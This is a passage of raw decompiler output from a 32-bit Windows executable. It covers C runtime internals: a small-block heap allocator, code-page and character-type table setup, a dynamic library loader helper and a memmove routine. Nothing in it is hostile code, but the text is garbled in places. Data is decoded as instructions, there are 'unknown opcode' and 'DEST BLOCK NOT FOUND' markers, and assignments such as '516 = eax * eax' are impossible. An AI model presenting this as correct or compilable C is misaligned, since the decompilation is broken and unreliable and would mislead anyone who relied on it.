    eax = *__imp__HeapAlloc();
    *(esi + 16) = eax;
    if(eax != edi) {
        (save)4;
        (save)8192;
        (save)1048576;
        (save)edi;
        eax = *__imp__VirtualAlloc();
        *(esi + 12) = eax;
        if(eax != edi) {
            goto L0040c639;
        }
        *__imp__HeapFree( *L0041ADC0, edi, *(esi + 16));
    }
L0040c635:
    eax = 0;
    goto L0040c650;
L0040c639:
    *(esi + 8) = *(esi + 8) | -1;
    *esi = edi;
    *(esi + 4) = edi;
    *L0041ADB8 = *L0041ADB8 + 1;
    *( *(esi + 16)) = *( *(esi + 16)) | -1;
    eax = esi;
L0040c650:
    (restore)edi;
    (restore)esi;
}

/*	Procedure: 0x0040C653 - 0x0040C74D
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040C653(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    ecx = A8;
    (save)ebx;
    (save)esi;
    (save)edi;
    esi = *(ecx + 16);
    eax = *(ecx + 8);
    for(ebx = 0; eax >= 0; ebx = ebx + 1) {
        eax = eax << 1;
    }
    eax = ebx;
    (save)63;
    516 = eax * eax;
    (restore)edx;
    eax = eax + esi + 324;
    *(ebp - 4) = eax;
    do {
        *(eax + 8) = eax;
        *(eax + 4) = eax;
        eax = eax + 8;
    } while(edx = edx - 1);
    edi = (ebx << 15) + *(ecx + 12);
    eax = *__imp__VirtualAlloc(edi, 32768, 4096, 4);
    if(eax == 0) {
        eax = eax | -1;
    } else {
        edx = edi + 28672;
        if(edi <= edx) {
            eax = edi + 16;
            do {
                *(eax - 8) = *(eax - 8) | -1;
                *(eax + 4076) = *(eax + 4076) | -1;
                *(eax - 4) = 4080;
                *eax = eax + 4092;
                *(eax + 4) = eax + -4100;
                *(eax + 4072) = 4080;
                eax = eax + 4096;
            } while(eax - 16 <= edx);
        }
        eax = *(ebp - 4);
        ecx = edi + 12;
        eax = eax + 504;
        edi = 1;
        *(eax + 4) = ecx;
        *(ecx + 8) = eax;
        ecx = edx + 12;
        *(eax + 8) = ecx;
        *( *(eax + 8) + 4) = eax;
        *(esi + ebx * 4 + 68) = 0;
        *(esi + ebx * 4 + 196) = 1;
        al = *(esi + 67);
        cl = al + 1;
        eax = A8;
        *(esi + 67) = cl;
        if(al == 0) {
            *(eax + 4) = *(eax + 4) | 1;
        }
        *(eax + 8) = *(eax + 8) & !(-2147483648 >> ebx);
        eax = ebx;
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
}

/*	Procedure: 0x0040C74E - 0x0040CA43
 *	Argument size: 3
 *	Local size: 12
 *	Save regs size: 0
 */

L0040C74E(A8, Ac, Af, A10, A13)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  Af;
/* unknown */ void  A10;
/* unknown */ void  A13;
{
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ecx = A8;
    (save)ebx;
    (save)esi;
    (save)edi;
    edi = Ac;
    edx = edi;
    edx = edx - *(ecx + 12);
    eax = *(ecx + 16);
    esi = A10 + 23 & -16;
    edx = edx >> 15;
    ecx = edx;
    516 = ecx * ecx;
    Vfffffff4 = ecx + eax + 324;
    ecx = *(edi - 4) - 1;
    esi :: ecx;
    A10 = ecx;
    ebx = *(ecx + edi - 4);
    Vfffffffc = ebx;
    if(!(edi = ecx + edi - 4)) {
        if(!(bl & 1) && esi <= ebx + ecx) {
            ecx = (Vfffffffc >> 4) - 1;
            Vfffffff8 = ecx;
            if(ecx > 63) {
                ecx = 63;
                Vfffffff8 = 63;
            }
            if(*(edi + 4) == *(edi + 8)) {
                if(ecx >= 32) {
                    goto L0040c7f1;
                }
                ebx = -2147483648 >> cl;
                ecx = Vfffffff8 + eax + 4;
                ebx = !ebx;
                *(eax + edx * 4 + 68) = *(eax + edx * 4 + 68) & ebx;
                if(!( *ecx = *ecx - 1)) {
                    *A8 = *A8 & ebx;
                    goto L0040c815;
L0040c7f1:
                    ecx = ecx + -32;
                    ebx = -2147483648 >> cl;
                    ecx = Vfffffff8 + eax + 4;
                    ebx = !ebx;
                    *(eax + edx * 4 + 196) = *(eax + edx * 4 + 196) & ebx;
                    if(!( *ecx = *ecx - 1)) {
                        *(A8 + 4) = *(A8 + 4) & ebx;
                    }
                }
            }
L0040c815:
            ecx = *(edi + 8);
            *(ecx + 4) = *(edi + 4);
            ecx = *(edi + 4);
            *(ecx + 8) = *(edi + 8);
            Vfffffffc = Vfffffffc + A10 - esi;
            if(Vfffffffc > 0) {
                edi = (Vfffffffc >> 4) - 1;
                ecx = Ac + esi - 4;
                if(edi > 63) {
                    edi = 63;
                }
                ebx = Vfffffff4 + edi * 8;
                A10 = ebx;
                *(ecx + 4) = *(A10 + 4);
                ebx = A10;
                *(ecx + 8) = ebx;
                *( *(ecx + 8) + 4) = ecx;
                *( *(ecx + 4) + 8) = ecx;
                if(*(ecx + 4) == *(ecx + 8)) {
                    cl = *(edi + eax + 4);
                    edi :: 32;
                    A13 = cl;
                    *(edi + eax + 4) = cl;
                    if(!(cl = A13 + 1)) {
                        if(A13 == 0) {
                            ecx = edi;
                            ebx = -2147483648 >> cl;
                            *A8 = *A8 | ebx;
                        }
                        eax = eax + edx * 4 + 68;
                        edx = -2147483648;
                        ecx = edi;
                    } else {
                        if(A13 == 0) {
                            ecx = edi - 32;
                            ebx = -2147483648 >> cl;
                            *(A8 + 4) = *(A8 + 4) | ebx;
                        }
                        eax = eax + edx * 4 + 196;
                        ecx = edi - 32;
                        edx = -2147483648;
                    }
                    *eax = *eax | edx >> cl;
                }
                edx = Ac;
                ecx = Vfffffffc;
                eax = edx + esi - 4;
                *eax = ecx;
                *( *eax + eax - 4) = *eax;
            } else {
                edx = Ac;
            }
            *(edx - 4) = eax;
            *(edx + esi - 8) = *(edx - 4);
            goto L0040ca3c;
        }
        eax = 0;
    } else {
        if(!(eax = esi + 1)) {
            ebx = Ac;
            A10 = A10 - esi;
            ecx = esi + 1;
            *(ebx - 4) = ecx;
            ebx = ebx + esi - 4;
            Ac = ebx;
            esi = (A10 >> 4) - 1;
            *(ebx - 4) = ecx;
            if(esi > 63) {
                esi = 63;
            }
            if(!(Vfffffffc & 1)) {
                esi = (Vfffffffc >> 4) - 1;
                if(esi > 63) {
                    esi = 63;
                }
                if(*(edi + 4) == *(edi + 8)) {
                    if(esi < 32) {
                        ebx = -2147483648 >> esi;
                        esi = esi + eax + 4;
                        ebx = !ebx;
                        *(eax + edx * 4 + 68) = *(eax + edx * 4 + 68) & ebx;
                        if(!( *esi = *esi - 1)) {
                            *A8 = *A8 & ebx;
                        }
                    } else {
                        ecx = esi - 32;
                        ebx = -2147483648 >> cl;
                        ecx = esi + eax + 4;
                        ebx = !ebx;
                        *(eax + edx * 4 + 196) = *(eax + edx * 4 + 196) & ebx;
                        if(!( *ecx = *ecx - 1)) {
                            *(A8 + 4) = *(A8 + 4) & ebx;
                        }
                    }
                    ebx = Ac;
                }
                ecx = *(edi + 8);
                *(ecx + 4) = *(edi + 4);
                ecx = *(edi + 4);
                *(ecx + 8) = *(edi + 8);
                esi = A10 + Vfffffffc;
                A10 = esi;
                esi = (A10 >> 4) - 1;
                if(esi > 63) {
                    esi = 63;
                }
            }
            ecx = Vfffffff4;
            edi = *(ecx + esi * 8 + 4);
            ecx = ecx + esi * 8;
            *(ebx + 4) = edi;
            *(ebx + 8) = ecx;
            *( *(ebx + 8) + 4) = ebx;
            *( *(ebx + 4) + 8) = ebx;
            if(*(ebx + 4) == *(ebx + 8)) {
                cl = *(esi + eax + 4);
                esi :: 32;
                Af = cl;
                *(esi + eax + 4) = cl;
                if(!(cl = Af + 1)) {
                    if(Af == 0) {
                        ecx = esi;
                        edi = -2147483648 >> cl;
                        *A8 = *A8 | edi;
                    }
                    eax = eax + edx * 4 + 68;
                    edx = -2147483648;
                    ecx = esi;
                } else {
                    if(Af == 0) {
                        ecx = esi - 32;
                        edi = -2147483648 >> cl;
                        *(A8 + 4) = *(A8 + 4) | edi;
                    }
                    eax = eax + edx * 4 + 196;
                    ecx = esi - 32;
                    edx = -2147483648;
                }
                *eax = *eax | edx >> cl;
            }
            eax = A10;
            *ebx = eax;
            *( *ebx + ebx - 4) = *ebx;
        }
L0040ca3c:
        eax = 1;
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
}

stack space not deallocated on return
/*	Procedure: 0x0040CA44 - 0x0040CB8C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040CA44()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253952;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 24;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    eax = *L0041A9F0;
    ebx = 0;
    if(eax == 0) {
        (save)ebp - 28;
        esi = 1;
        (save)1;
        (save)4253948;
        (save)1;
        if(*__imp__GetStringTypeW() != 0) {
            eax = esi;
        } else {
            (save)ebp - 28;
            (save)esi;
            (save)4253944;
            (save)esi;
            (save)ebx;
            if(*__imp__GetStringTypeA() == 0) {
                goto L0040cb79;
            }
            eax = 2;
        }
        *L0041A9F0 = eax;
    }
    if(eax == 2) {
        eax = *(ebp + 28);
        if(eax == ebx) {
            eax = *L0041AA0C;
        }
        (save) *(ebp + 20);
        (save) *(ebp + 16);
        (save) *(ebp + 12);
        (save) *(ebp + 8);
        (save)eax;
        eax = *__imp__GetStringTypeA();
    } else {
        if(eax == 1) {
            if(*(ebp + 24) == ebx) {
                *(ebp + 24) = *L0041AA1C;
            }
            (save)ebx;
            (save)ebx;
            (save) *(ebp + 16);
            (save) *(ebp + 12);
            eax = ~( *(ebp + 32));
            asm("sbb eax,eax");
            (save)(eax & 8) + 1;
            (save) *(ebp + 24);
            eax = *__imp__MultiByteToWideChar();
            *(ebp - 32) = eax;
            if(eax == ebx) {
                goto L0040cb79;
            }
            *(ebp - 4) = ebx;
            edi = eax + eax;
            al = edi + 3 & 252;
            L0040A560();
            *(ebp - 24) = esp;
            esi = esp;
            *(ebp - 36) = esi;
            L0040A590(esi, ebx, edi);
            goto L0040cb48;
            return(1);
            esp = *(ebp - 24);
            ebx = 0;
            esi = 0;
L0040cb48:
            *(ebp - 4) = *(ebp - 4) | -1;
            if(esi == ebx) {
                goto L0040cb79;
            }
            (save) *(ebp - 32);
            (save)esi;
            (save) *(ebp + 16);
            (save) *(ebp + 12);
            (save)1;
            (save) *(ebp + 24);
            eax = *__imp__MultiByteToWideChar();
            if(eax == ebx) {
                goto L0040cb79;
            }
            eax = *__imp__GetStringTypeW( *(ebp + 8), esi, eax, *(ebp + 20));
        } else {
L0040cb79:
            eax = 0;
        }
    }
    esp = ebp - 52;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040CB8D - 0x0040CC19
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 8
 */

L0040CB8D(A14, A1c)
/* unknown */ void  A14;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    esi = A14;
    (save)edi;
    A1c = A1c * esi;
    ebx = esi;
    if(esi <= -32) {
        if(esi == 0) {
            esi = 1;
        }
        esi = esi + 15 & -16;
    }
    while(1) {
        edi = 0;
        if(esi <= -32) {
            if(ebx <= *L004128C8) {
                L0040BE8F(9);
                (save)ebx;
                edi = L0040C299();
                L0040BEF0(9);
                if(edi != 0) {
                    break;
                }
            }
            (save)esi;
            (save)8;
            (save) *L0041ADC0;
            edi = *__imp__HeapAlloc();
            if(edi != 0) {
                goto L0040cc10;
            }
        }
        if(*L0041A984 == 0) {
            goto L0040cc10;
        }
        if(L0040BE4B(esi) == 0) {
            goto L0040cc16;
        }
    }
    L0040A590(edi, 0, ebx);
L0040cc10:
    eax = edi;
L0040cc12:
    (restore)edi;
    return;
L0040cc16:
    eax = 0;
    goto L0040cc12;
}

/*	Procedure: 0x0040CC1A - 0x0040CC2A
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040CC1A(A4)
/* unknown */ void  A4;
{



    return(L0040CC2B(A4, 0, 4));
}

/*	Procedure: 0x0040CC2B - 0x0040CC5B
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L0040CC2B(A4, A8, Ac)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = A4 & 255;
    if(!( *(eax + 4304033) & Ac)) {
        eax = A8 != 0 ? *(eax * 2 + 0x4124b2) & 65535 & A8 : 0;
        if(eax == 0) {
            return;
        }
    }
    return(1);
}

/*	Procedure: 0x0040CC5C - 0x0040CE08
 *	Argument size: 4
 *	Local size: 24
 *	Save regs size: 12
 */

L0040CC5C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffee;
	/* unknown */ void  Vffffffef;
	/* unknown */ void  Vfffffffc;



    L0040BE8F(25);
    ebx = L0040CE09(A8);
    (restore)ecx;
    A8 = ebx;
    if(ebx == *L0041AB78) {
L0040cc83:
        esi = 0;
    } else {
        if(ebx != 0) {
            edx = 0;
            eax = 0x4128d8;
            do {
                if(*eax == ebx) {
                    goto L0040cd11;
                }
                eax = eax + 48;
                edx = edx + 1;
            } while(eax < 0x4129c8);
            (save) & Vffffffe8;
            eax = *__imp__GetCPInfo(ebx);
            esi = 1;
            if(eax == 1) {
                (save)64;
                *L0041ADA4 = 0;
                eax = 0;
                edi = 4304032;
                Vffffffe8 :: 1;
                asm("rep stosd");
                *edi = al;
                *L0041AB78 = ebx;
                if(!(edi = edi + 1)) {
                    if(Vffffffee != 0) {
                        ecx = & Vffffffef;
                        do {
                            dl = *ecx;
                            if(dl == 0) {
                                break;
                            }
                            eax = *(ecx - 1) & 255;
                            for(edx = dl & 255; 1; eax = eax + 1) {
                                if(eax > edx) {
                                    goto L0040cd9b;
                                }
                                *(eax + 4304033) = *(eax + 4304033) | 4;
                            }
                            goto L0040cd11;
L0040cd9b:
                            ecx = ecx + 1 + 1;
                        } while(*(ecx - 1) != 0);
                        goto L0040cda7;
L0040cd11:
                        Vfffffffc = 0;
                        ecx = 64;
                        eax = 0;
                        edi = 4304032;
                        esi = edx + edx * 2;
                        asm("rep stosd");
                        esi = esi << 4;
                        *edi = al;
                        edi = edi + 1;
                        ebx = esi + 0x4128e8;
                        do {
                            ecx = ebx;
                            if(*ebx != 0) {
                                do {
                                    dl = *(ecx + 1);
                                    if(dl == 0) {
                                        break;
                                    }
                                    eax = *ecx & 255;
                                    edi = dl & 255;
                                    if(eax <= edi) {
                                        dl = *(Vfffffffc + 0x4128d0);
                                        do {
                                            *(eax + 4304033) = *(eax + 4304033) | dl;
                                            eax = eax + 1;
                                        } while(eax <= edi);
                                    }
                                    ecx = ecx + 1 + 1;
                                } while(*ecx != 0);
                            }
                            Vfffffffc = Vfffffffc + 1;
                            ebx = ebx + 8;
                        } while(Vfffffffc < 4);
                        eax = A8;
                        *L0041AB8C = 1;
                        *L0041AB78 = eax;
                        eax = L0040CE53(eax);
                        esi = esi + 0x4128dc;
                        edi = 4303744;
                        *L0041AB80 = *esi;
                        edi = edi + 4;
                        esi = esi + 4;
                        *edi = *esi;
                        edi = edi + 4;
                        esi = esi + 4;
                        *L0041ADA4 = eax;
                        *edi = *esi;
                        edi = edi + 4;
                        esi = esi + 4;
                        goto L0040cded;
                    }
L0040cda7:
                    eax = esi;
                    do {
                        *(eax + 4304033) = *(eax + 4304033) | 8;
                        eax = eax + 1;
                    } while(eax < 255);
                    *L0041ADA4 = L0040CE53(ebx);
                    *L0041AB8C = esi;
                } else {
                    *L0041AB8C = 0;
                }
                *L0041AB80 = 0;
                *L0041AB84 = 0;
                *L0041AB88 = 0;
                edi = 4303756;
                goto L0040cded;
            }
            if(*L0041A9F4 == 0) {
                goto L0040cdf7;
            }
        }
        L0040CE86();
L0040cded:
        L0040CEAF();
        goto L0040cc83;
L0040cdf7:
        esi = esi | -1;
    }
    L0040BEF0(25);
    return(esi);
}

/* DEST BLOCK NOT FOUND: 0040ce17 -> 0040ce29 */
/* DEST BLOCK NOT FOUND: 0040ce23 -> 0040ce29 */
/*	Procedure: 0x0040CE09 - 0x0040CE22
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040CE09(A4)
/* unknown */ void  A4;
{



    *L0041A9F4 = 0;
    if(A4 != -2) {
        goto L0040ce29;
    }
    *L0041A9F4 = 1;
}

/* DEST BLOCK NOT FOUND: 0040ce2c -> 0040ce3e */
/* DEST BLOCK NOT FOUND: 0040ce38 -> 0040ce3e */
/*	Procedure: 0x0040CE23 - 0x0040CE37
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetOEMCP()
{



    goto ( *__imp__GetOEMCP);
    if(eax != -3) {
        goto L0040ce3e;
    }
    *L0041A9F4 = 1;
}

/* DEST BLOCK NOT FOUND: 0040ce41 -> 0040ce52 */
/*	Procedure: 0x0040CE38 - 0x0040CE52
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetACP()
{



    goto ( *__imp__GetACP);
    if(eax == -4) {
        eax = *L0041AA1C;
        *L0041A9F4 = 1;
    }
}

/*	Procedure: 0x0040CE53 - 0x0040CE85
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040CE53(A4)
/* unknown */ void  A4;
{



    if(!(eax = A4 - 932)) {
        if(!(eax = eax - 4)) {
            if(!(eax = eax - 13)) {
                if(!(eax = eax - 1)) {
                    return(0);
                }
                return(1028);
            }
            return(1042);
        }
        return(2052);
    }
    return(1041);
}

/*	Procedure: 0x0040CE86 - 0x0040CEAE
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L0040CE86()
{
	/* unknown */ void  edi;



    ecx = 64;
    eax = 0;
    edi = 4304032;
    asm("rep stosd");
    *edi = al;
    edi = edi + 1;
    *L0041AB78 = 0;
    *L0041AB8C = 0;
    *L0041ADA4 = 0;
    *L0041AB80 = 0;
    *L0041AB84 = 0;
    *L0041AB88 = 0;
    edi = 4303756;
    return(0);
}

/*	Procedure: 0x0040CEAF - 0x0040D033
 *	Argument size: -1300
 *	Local size: 1300
 *	Save regs size: 0
 */

L0040CEAF()
{
	/* unknown */ void  Vfffffaec;
	/* unknown */ void  Vfffffcec;
	/* unknown */ void  Vfffffdec;
	/* unknown */ void  Vfffffeec;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff3;



    (save)esi;
    (save) & Vffffffec;
    (save) *L0041AB78;
    if(*__imp__GetCPInfo() == 1) {
        eax = 0;
        esi = 256;
        do {
            *(ebp + eax + -276) = al;
            eax = eax + 1;
        } while(eax < esi);
        al = Vfffffff2;
        Vfffffeec = 32;
        if(al != 0) {
            (save)ebx;
            (save)edi;
            edx = & Vfffffff3;
            do {
                ecx = *edx & 255;
                eax = al & 255;
                if(eax <= ecx) {
                    ecx = ecx - eax;
                    edi = ebp + eax + -276;
                    ecx = ecx + 1;
                    eax = 538976288;
                    ebx = ecx;
                    ecx = ecx >> 2;
                    asm("rep stosd");
                    ecx = ebx & 3;
                    asm("rep stosb");
                }
                edx = edx + 1 + 1;
                al = *(edx - 1);
            } while(al != 0);
            (restore)edi;
            (restore)ebx;
        }
        L0040CA44();
        L0040D415();
        L0040D415( *L0041ADA4, 512, & Vfffffeec, esi, & Vfffffcec, esi, *L0041AB78, 0, *L0041ADA4, esi, & Vfffffeec, esi, & Vfffffdec, esi, *L0041AB78, 0, 1, & Vfffffeec, esi, & Vfffffaec, *L0041AB78, *L0041ADA4, 0);
        eax = 0;
        ecx = & Vfffffaec;
        do {
            dx = *ecx;
            if(dl & 1) {
                if(dl & 2) {
                    *(eax + 4303776) = 0;
                    goto L0040cfdf;
                }
                *(eax + 4304033) = *(eax + 4304033) | 32;
                dl = *(ebp + eax + -788);
            } else {
                *(eax + 4304033) = *(eax + 4304033) | 16;
                dl = *(ebp + eax + -532);
            }
            *(eax + 4303776) = dl;
L0040cfdf:
            eax = eax + 1;
            ecx = ecx + 1 + 1;
        } while(eax < esi);
    } else {
        eax = 0;
        esi = 256;
        do {
            if(eax < 65 || eax > 90) {
                if(eax < 97 || eax > 122) {
                    *(eax + 4303776) = 0;
                    goto L0040d02c;
                }
                *(eax + 4304033) = *(eax + 4304033) | 32;
                cl = al - 32;
            } else {
                *(eax + 4304033) = *(eax + 4304033) | 16;
                cl = al + 32;
            }
            *(eax + 4303776) = cl;
L0040d02c:
            eax = eax + 1;
        } while(eax < esi);
    }
    (restore)esi;
}

/* DEST BLOCK NOT FOUND: 0040d03b -> 0040d04f */
/*	Procedure: 0x0040D034 - 0x0040D04F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D034()
{



    if(*L0041AEE8 == 0) {
        eax = L0040CC5C(-3);
        *L0041AEE8 = 1;
    }
}

stack space not deallocated on return
/*	Procedure: 0x0040D050 - 0x0040D0DF
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 4
 */

L0040D050(A1c)
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;



    ebx = 0;
    (save)esi;
    (save)edi;
    if(*L0041A9F8 == 0) {
        (save)4254012;
        edi = *__imp__LoadLibraryA();
        if(edi == ebx) {
            goto L0040d0d5;
        }
        esi = __imp__GetProcAddress;
        (save)4254000;
        (save)edi;
        eax = *__imp__GetProcAddress();
        *L0041A9F8 = eax;
        if(eax == 0) {
            goto L0040d0d5;
        }
        (save)4253984;
        (save)edi;
        (save)4253964;
        (save)edi;
        *L0041A9FC = *esi();
        *L0041AA00 = *esi();
    }
    eax = *L0041A9FC;
    if(eax != 0) {
        ebx = *eax();
        if(ebx != 0) {
            eax = *L0041AA00;
            if(eax != 0) {
                (save)ebx;
                ebx = *eax();
            }
        }
    }
    eax = *L0041a9f8(ebx, A1c, A1c, A1c);
L0040d0d1:
    (restore)edi;
    (restore)esi;
    return;
L0040d0d5:
    eax = 0;
    goto L0040d0d1;
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 0040d160 -> 02885967 */
/*	Procedure: 0x0040D0E0 - 0x0040D3D6
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 8
 */

L0040D0E0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    esi = Ac;
    ecx = A10;
    edi = A8;
    eax = ecx;
    edx = ecx;
    eax = eax + esi;
    if(edi <= esi || edi >= eax) {
        if(!(edi & 3)) {
            ecx = ecx >> 2;
            edx = edx & 3;
            if(ecx < 8) {
                goto L0040d13c;
            }
            asm("rep movsd");
            goto *(edx * 4 + 0x40d228)[L0040d238, L0040d240, L0040d24c, L0040d260, ]goto ( *(edx * 4 + 0x40d228));
L0040d11b:
        }
        eax = edi;
        edx = 3;
        if(!(ecx = ecx - 4)) {
            eax = eax & 3;
            goto ( *(eax * 4 + 0x40d140));
        }
        goto ( *(ecx * 4 + 0x40d238));
L0040d13c:
        goto *(ecx * 4 + 0x40d1bc)[L0040d21f, L0040d20c, L0040d204, L0040d1fc, L0040d1f4, L0040d1ec, L0040d1e4, L0040d1dc, ]goto ( *(ecx * 4 + 0x40d1bc));
        (save)eax;
        asm("rol dword [eax+0x0],1");
        if(ecx = ecx + eax) {
            goto L0040d11b;
        }
        eax = eax + 1;
        *(eax + 587219153) = *(eax + 587219153) + ah;
        asm("ror dword [edx+0x8a078806],1");
        esi = esi + 1;
        *(eax + 1183449415) = *(eax + 1183449415) + ecx;
        al = al + cl;
        goto L02885967;
        esi = esi + 3;
        edi = edi + 3;
        if(ecx < 8) {
            goto L0040d13c;
        }
        asm("rep movsd");
        goto *(edx * 4 + 0x40d228)[L0040d238, L0040d240, L0040d24c, L0040d260, ]goto ( *(edx * 4 + 0x40d228));
        edx = edx & ecx;
        al = *esi;
        *edi = al;
        al = *(esi + 1);
        ecx = ecx >> 2;
        *(edi + 1) = al;
        esi = esi + 2;
        edi = edi + 2;
        if(ecx < 8) {
            goto L0040d13c;
        }
        asm("rep movsd");
        goto *(edx * 4 + 0x40d228)[L0040d238, L0040d240, L0040d24c, L0040d260, ]goto ( *(edx * 4 + 0x40d228));
        edx = edx & ecx;
        al = *esi;
        *edi = al;
        esi = esi + 1;
        ecx = ecx >> 2;
        edi = edi + 1;
        if(ecx < 8) {
            goto L0040d13c;
        }
        asm("rep movsd");
        goto *(edx * 4 + 0x40d228)[L0040d238, L0040d240, L0040d24c, L0040d260, ]goto ( *(edx * 4 + 0x40d228));
        eax = *(esi + ecx * 4 - 28);
        *(edi + ecx * 4 - 28) = eax;
        eax = *(esi + ecx * 4 - 24);
        *(edi + ecx * 4 - 24) = eax;
        eax = *(esi + ecx * 4 - 20);
        *(edi + ecx * 4 - 20) = eax;
        eax = *(esi + ecx * 4 - 16);
        *(edi + ecx * 4 - 16) = eax;
        eax = *(esi + ecx * 4 - 12);
        *(edi + ecx * 4 - 12) = eax;
        eax = *(esi + ecx * 4 - 8);
        *(edi + ecx * 4 - 8) = eax;
        eax = *(esi + ecx * 4 - 4);
        *(edi + ecx * 4 - 4) = eax;
        eax = ecx * 4;
        esi = esi + eax;
        edi = edi + eax;
        goto *(edx * 4 + 0x40d228)[L0040d238, L0040d240, L0040d24c, L0040d260, ]goto ( *(edx * 4 + 0x40d228));
        return(A8);
        al = *esi;
        *edi = al;
        esp = ebp;
        return(A8);
        al = *esi;
        *edi = al;
        al = *(esi + 1);
        *(edi + 1) = al;
        esp = ebp;
        return(A8);
        al = *esi;
        *edi = al;
        al = *(esi + 1);
        *(edi + 1) = al;
        al = *(esi + 2);
        *(edi + 2) = al;
        esp = ebp;
        return(A8);
    }
    esi = ecx + esi - 4;
    edi = ecx + edi - 4;
    if(!(edi & 3)) {
        ecx = ecx >> 2;
        edx = edx & 3;
        if(ecx >= 8) {
            asm("std");
            asm("rep movsd");
            asm("cld");
            goto *(edx * 4 + 0x40d3c0)[L0040d3d0, L0040d3d8, L0040d3e8, L0040d3fc, ]goto ( *(edx * 4 + 0x40d3c0));
        }
L0040d2a0:
        ecx = ~ecx;
        goto *(ecx * 4 + 0x40d370)[L0040d3b7, ]goto ( *(ecx * 4 + 0x40d370));
    }
    eax = edi;
    edx = 3;
    if(ecx >= 4) {
        eax = eax & 3;
        ecx = ecx - eax;
        goto ( *(eax * 4 + 0x40d2c8));
    }
    goto *(ecx * 4 + 0x40d3c0)[L0040d3d0, L0040d3d8, L0040d3e8, L0040d3fc, ]goto ( *(ecx * 4 + 0x40d3c0));
    asm("fcom st2");
    al = eax + 1 + bh;
    asm("rol byte [eax+0x0],cl");
    bl = bl & dl;
    eax = eax + 1;
    *(edx + -786234554) = *(edx + -786234554) + cl;
    *(edi + 3) = al;
    esi = esi - 1;
    ecx = ecx >> 2;
    edi = edi - 1;
    if(ecx < 8) {
        goto L0040d2a0;
    }
    asm("std");
    asm("rep movsd");
    asm("cld");
    goto *(edx * 4 + 0x40d3c0)[L0040d3d0, L0040d3d8, L0040d3e8, L0040d3fc, ]goto ( *(edx * 4 + 0x40d3c0));
    al = *(esi + 3);
    edx = edx & ecx;
    *(edi + 3) = al;
    al = *(esi + 2);
    ecx = ecx >> 2;
    *(edi + 2) = al;
    esi = esi - 2;
    edi = edi - 2;
    if(ecx < 8) {
        goto L0040d2a0;
    }
    asm("std");
    asm("rep movsd");
    asm("cld");
    goto *(edx * 4 + 0x40d3c0)[L0040d3d0, L0040d3d8, L0040d3e8, L0040d3fc, ]goto ( *(edx * 4 + 0x40d3c0));
    al = *(esi + 3);
    edx = edx & ecx;
    *(edi + 3) = al;
    al = *(esi + 2);
    *(edi + 2) = al;
    al = *(esi + 1);
    ecx = ecx >> 2;
    *(edi + 1) = al;
    esi = esi - 3;
    edi = edi - 3;
    if(ecx < 8) {
        goto L0040d2a0;
    }
    asm("std");
    asm("rep movsd");
    asm("cld");
    goto *(edx * 4 + 0x40d3c0)[L0040d3d0, L0040d3d8, L0040d3e8, L0040d3fc, ]goto ( *(edx * 4 + 0x40d3c0));
    == ? L0040d329 : ;
    *(ebx + edx * 8 + 64) = *(ebx + edx * 8 + 64) + bh;
    *(ebx + edx * 8 + -745799616) = *(ebx + edx * 8 + -745799616) + eax + 1;
    *(ebx + edx * 8 + -744751040) = *(ebx + edx * 8 + -744751040) + dl;
    *(ebx + edx * 8 + -742981568) = *(ebx + edx * 8 + -742981568) + eax + 1 + 1 + 1;
    eax = eax + 1 + 1 + 1 + 1;
    *(ebx + -1994617276) = *(ebx + -1994617276) + cl;
    esp = esp + 1;
    asm("Unknown opcode 0x8f");
    asm("sbb al,0x8b");
    esp = esp + 1;
    ds = *eax;
    *(edi + ecx * 4 + 24) = eax;
    *(edi + ecx * 4 + 20) = *(esi + ecx * 4 + 20);
    *(edi + ecx * 4 + 16) = *(esi + ecx * 4 + 16);
    *(edi + ecx * 4 + 12) = *(esi + ecx * 4 + 12);
    *(edi + ecx * 4 + 8) = *(esi + ecx * 4 + 8);
    *(edi + ecx * 4 + 4) = *(esi + ecx * 4 + 4);
    eax = ecx * 4;
    esi = esi + eax;
    edi = edi + eax;
    goto *(edx * 4 + 0x40d3c0)[L0040d3d0, L0040d3d8, L0040d3e8, L0040d3fc, ]goto ( *(edx * 4 + 0x40d3c0));
    esp = ebp;
    return(A8);
}

stack space not deallocated on return
